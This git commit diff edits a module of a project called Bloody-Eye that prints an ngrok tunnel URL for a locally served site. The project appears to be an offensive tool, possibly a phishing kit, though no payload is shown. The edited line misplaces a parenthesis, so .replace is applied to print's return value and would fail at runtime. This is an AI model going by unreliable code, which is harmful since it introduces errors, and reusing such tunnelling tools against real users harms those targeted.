bd771fb5346275738b834bb609e7181a7b69a71c
spaceboy11 <77511227+spaceboy11@users.noreply.github.com>
2021-10-21 00:08:49 +0330

    Update localhost.py

--- Bloody-Eye/modules/localhost.py
+++ Bloody-Eye/modules/localhost.py
@@ -549,7 +549,7 @@ exit();""")
        global token
        a = ngrok.connect(6060,"http",auth_token=token)
        print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
-       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> https://localhost:6060",""))
+       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://")).replace("-> https://localhost:6060","")
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       phpserver()
